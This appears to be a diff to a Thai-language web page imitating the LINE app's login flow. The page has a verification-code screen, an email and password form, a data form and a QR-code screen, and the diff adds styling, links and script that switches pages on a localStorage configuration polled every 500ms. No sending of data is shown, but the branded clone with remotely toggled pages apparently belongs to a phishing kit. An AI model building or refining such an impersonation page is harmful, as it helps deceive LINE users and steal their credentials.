@@ -164,6 +164,103 @@
             border-bottom: none;
         }
         
+        .help-text {
+            color: #6b7280;
+            font-size: 14px;
+            margin: 15px 0;
+            line-height: 1.4;
+        }
+        
+        .link-section {
+            margin: 20px 0;
+        }
+        
+        .link-text {
+            color: #3b82f6;
+            text-decoration: none;
+            font-size: 14px;
+        }
+        
+        .link-text:hover {
+            text-decoration: underline;
+        }
+        
+        .link-text-gray {
+            color: #9ca3af;
+            text-decoration: none;
+            font-size: 14px;
+        }
+        
+        .link-text-gray:hover {
+            text-decoration: underline;
+        }
+        
+        .btn-disabled {
+            background: #e5e7eb;
+            color: #9ca3af;
+            cursor: not-allowed;
+        }
+        
+        .divider {
+            margin: 30px 0;
+            text-align: center;
+            position: relative;
+        }
+        
+        .divider::before {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 0;
+            right: 0;
+            height: 1px;
+            background: #e5e7eb;
+        }
+        
+        .divider span {
+            background: white;
+            padding: 0 15px;
+            color: #6b7280;
+            font-size: 14px;
+        }
+        
+        .forgot-section {
+            margin-top: 30px;
+            text-align: center;
+            font-size: 14px;
+            color: #6b7280;
+        }
+        
+        .forgot-section a {
+            margin-left: 5px;
+        }
+        
+        .qr-refresh {
+            margin: 15px 0;
+            text-align: center;
+        }
+        
+        .qr-help {
+            color: #6b7280;
+            font-size: 14px;
+            margin: 20px 0;
+            line-height: 1.5;
+            text-align: center;
+        }
+        
+        .qr-code {
+            width: 200px;
+            height: 200px;
+            background: white;
+            border: 2px solid #e5e7eb;
+            border-radius: 12px;
+            margin: 20px auto;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        
         @media (max-width: 480px) {
             .container {
                 margin: 20px;
@@ -177,19 +274,24 @@
         <!-- หน้ารหัสยืนยันตัวตน -->
         <div id="verification-page">
             <div class="logo">LINE</div>
-            <h1 class="title" id="verification-title">รหัสยืนยันตัวตน</h1>
-            <p class="subtitle" id="verification-subtitle">กรุณาใช้รหัสยืนยันตัวตนด้านล่างเพื่อใช้งาน LINE อย่างปลอดภัย</p>
+            <h1 class="title" id="verification-title">รหัสยืนยันตัวตน - ทดสอบการแก้ไข</h1>
+            <p class="subtitle" id="verification-subtitle">กรุณาใส่รหัสยืนยันตัวตนที่ส่งไปยัง LINE อย่างน้อย 4 ตัวอักษร</p>
             
-            <div class="verification-code" id="verification-code">1234</div>
-            <div class="timer" id="timer">เหลือเวลา: 03:00</div>
+            <div class="verification-code" id="verification-code">1868</div>
+            <div class="timer" id="timer">เหลือเวลา: 02:59</div>
             
-            <button class="btn btn-primary" onclick="goToEmailPage()">เข้าสู่ระบบด้วยรหัสยืนยัน</button>
+            <p class="help-text">โปรดใส่รหัสยืนยันตัวตนแอป LINE<br>สำหรับมือถือใหม่ให้ใหม่</p>
+            
+            <button class="btn btn-primary" onclick="submitVerification()">เข้าสู่ระบบด้วยรหัสยืนยัน</button>
+            
+            <div class="link-section">
+                <a href="#" onclick="goToQRPage()" class="link-text">เข้าสู่ระบบด้วยคิวอาร์โค้ด</a>
+            </div>
         </div>
         
         <!-- หน้าล็อกอินด้วยอีเมล -->
         <div id="email-page" class="hidden">
             <div class="logo">LINE</div>
-            <h1 class="title" id="email-title">LINE</h1>
             
             <div class="form-group">
                 <label class="form-label" id="email-label">อีเมล</label>
@@ -207,7 +309,20 @@
                 <input type="password" class="form-input" id="password-input" placeholder="รหัสผ่าน">
             </div>
             
-            <button class="btn btn-primary" onclick="goToFormPage()">เข้าสู่ระบบ</button>
+            <button class="btn btn-disabled" id="login-btn" onclick="goToFormPage()">เข้าสู่ระบบ</button>
+            
+            <div class="divider">
+                <span>เข้าสู่ระบบด้วยคิวอาร์โค้ด</span>
+            </div>
+            
+            <div class="link-section">
+                <a href="#" onclick="goToQRPage()" class="link-text">เข้าสู่ระบบด้วยคิวอาร์โค้ด</a>
+            </div>
+            
+            <div class="forgot-section">
+                <span>ลืมรหัสผ่านใช่ไหม?</span>
+                <a href="#" class="link-text">ลืมรหัสผ่าน</a>
+            </div>
         </div>
         
         <!-- หน้าฟอร์มข้อมูล -->
@@ -233,12 +348,22 @@
         <div id="qr-page" class="hidden">
             <div class="logo">LINE</div>
             <h1 class="title" id="qr-title">เข้าสู่ระบบด้วยคิวอาร์โค้ด</h1>
-            <p class="subtitle" id="qr-subtitle">โปรดเปิดคิวอาร์โค้ดในแอป LINE สำหรับมือถือใหม่ แล้วกดสแกนคิวอาร์โค้ด</p>
             
-            <div class="qr-code">QR Code จะแสดงที่นี่</div>
+            <div class="qr-code">
+                <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTUwIiBoZWlnaHQ9IjE1MCIgdmlld0JveD0iMCAwIDE1MCAxNTAiIGZpbGw9Im5vbmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+CjxyZWN0IHdpZHRoPSIxNTAiIGhlaWdodD0iMTUwIiBmaWxsPSJ3aGl0ZSIvPgo8IS0tIFFSIENvZGUgcGF0dGVybiAtLT4KPHN2ZyB3aWR0aD0iMTUwIiBoZWlnaHQ9IjE1MCIgdmlld0JveD0iMCAwIDI1IDI1IiBmaWxsPSJub25lIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPgo8IS0tIFRvcCBsZWZ0IGNvcm5lciAtLT4KPHJlY3QgeD0iMCIgeT0iMCIgd2lkdGg9IjciIGhlaWdodD0iNyIgZmlsbD0iYmxhY2siLz4KPHJlY3QgeD0iMSIgeT0iMSIgd2lkdGg9IjUiIGhlaWdodD0iNSIgZmlsbD0id2hpdGUiLz4KPHJlY3QgeD0iMiIgeT0iMiIgd2lkdGg9IjMiIGhlaWdodD0iMyIgZmlsbD0iYmxhY2siLz4KCjwhLS0gVG9wIHJpZ2h0IGNvcm5lciAtLT4KPHJlY3QgeD0iMTgiIHk9IjAiIHdpZHRoPSI3IiBoZWlnaHQ9IjciIGZpbGw9ImJsYWNrIi8+CjxyZWN0IHg9IjE5IiB5PSIxIiB3aWR0aD0iNSIgaGVpZ2h0PSI1IiBmaWxsPSJ3aGl0ZSIvPgo8cmVjdCB4PSIyMCIgeT0iMiIgd2lkdGg9IjMiIGhlaWdodD0iMyIgZmlsbD0iYmxhY2siLz4KCjwhLS0gQm90dG9tIGxlZnQgY29ybmVyIC0tPgo8cmVjdCB4PSIwIiB5PSIxOCIgd2lkdGg9IjciIGhlaWdodD0iNyIgZmlsbD0iYmxhY2siLz4KPHJlY3QgeD0iMSIgeT0iMTkiIHdpZHRoPSI1IiBoZWlnaHQ9IjUiIGZpbGw9IndoaXRlIi8+CjxyZWN0IHg9IjIiIHk9IjIwIiB3aWR0aD0iMyIgaGVpZ2h0PSIzIiBmaWxsPSJibGFjayIvPgoKPCEtLSBEYXRhIHBhdHRlcm4gLS0+CjxyZWN0IHg9IjkiIHk9IjkiIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIGZpbGw9ImJsYWNrIi8+CjxyZWN0IHg9IjExIiB5PSI5IiB3aWR0aD0iMSIgaGVpZ2h0PSIxIiBmaWxsPSJibGFjayIvPgo8cmVjdCB4PSIxMyIgeT0iOSIgd2lkdGg9IjEiIGhlaWdodD0iMSIgZmlsbD0iYmxhY2siLz4KPHN2Zz4K" alt="QR Code" style="width: 150px; height: 150px;">
+            </div>
+            
+            <div class="qr-refresh">
+                <a href="#" onclick="refreshQR()" class="link-text-gray">สร้างคิวอาร์โค้ดใหม่</a>
+            </div>
+            
+            <p class="qr-help">โปรดเปิดคิวอาร์โค้ดในแอป LINE สำหรับมือถือใหม่ แล้วกดสแกนคิวอาร์โค้ด</p>
             
             <button class="btn btn-secondary" onclick="goToEmailPage()">เข้าสู่ระบบด้วยอีเมลแทน</button>
-            <button class="btn btn-primary" onclick="window.open('https://help.line.me/line/android/categoryId/20000067/3/pc?lang=th', '_blank')">วิธีสแกนคิวอาร์โค้ด</button>
+            
+            <div class="link-section">
+                <a href="#" onclick="window.open('https://help.line.me/line/android/categoryId/20000067/3/pc?lang=th', '_blank')" class="link-text">วิธีสแกนคิวอาร์โค้ด</a>
+            </div>
         </div>
     </div>
 
@@ -314,6 +439,14 @@
             document.getElementById(pageId).classList.remove('hidden');
         }
 
+        function submitVerification() {
+            // ตรวจสอบรหัสยืนยัน
+            const code = document.getElementById('verification-code').textContent;
+            console.log('Verification code submitted:', code);
+            // ไปหน้าถัดไป
+            goToEmailPage();
+        }
+
         function goToEmailPage() {
             if (config.pages.email) {
                 showPage('email-page');
@@ -338,6 +471,11 @@
             } else {
                 showPage('verification-page');
             }
+        }
+
+        function refreshQR() {
+            // รีเฟรช QR Code
+            console.log('QR Code refreshed');
         }
 
         // ฟังก์ชันสำหรับ email suggestions
@@ -420,11 +558,58 @@
             window.addEventListener('storage', (e) => {
                 if (e.key === 'lineFormConfig') {
                     loadConfig();
+                    updatePageVisibility();
+                } else if (e.key === 'configUpdateTrigger') {
+                    // รับสัญญาณอัปเดตแบบ real-time
+                    loadConfig();
+                    updatePageVisibility();
                 }
             });
 
-            // ตรวจสอบการเปลี่ยนแปลงทุก 1 วินาที
-            setInterval(loadConfig, 1000);
+            // ตรวจสอบการเปลี่ยนแปลงทุก 500ms
+            setInterval(() => {
+                loadConfig();
+                updatePageVisibility();
+            }, 500);
+        }
+
+        // อัปเดตการแสดงผลหน้าตามการตั้งค่า
+        function updatePageVisibility() {
+            // ตรวจสอบว่าหน้าปัจจุบันยังเปิดใช้งานอยู่หรือไม่
+            const currentPage = getCurrentPage();
+            
+            if (currentPage && !config.pages[currentPage]) {
+                // ถ้าหน้าปัจจุบันถูกปิด ให้ไปหน้าที่เปิดอยู่
+                goToFirstAvailablePage();
+            }
+        }
+
+        // หาหน้าปัจจุบันที่แสดงอยู่
+        function getCurrentPage() {
+            const pages = ['verification-page', 'email-page', 'form-page', 'qr-page'];
+            for (let pageId of pages) {
+                const element = document.getElementById(pageId);
+                if (element && !element.classList.contains('hidden')) {
+                    return pageId.replace('-page', '');
+                }
+            }
+            return null;
+        }
+
+        // ไปหน้าแรกที่เปิดใช้งาน
+        function goToFirstAvailablePage() {
+            if (config.pages.verification) {
+                showPage('verification-page');
+            } else if (config.pages.email) {
+                showPage('email-page');
+            } else if (config.pages.form) {
+                showPage('form-page');
+            } else if (config.pages.qr) {
+                showPage('qr-page');
+            } else {
+                // ถ้าไม่มีหน้าไหนเปิด ให้แสดงหน้า verification เป็นค่าเริ่มต้น
+                showPage('verification-page');
+            }
         }
 
         // เริ่มต้นเมื่อโหลดหน้า
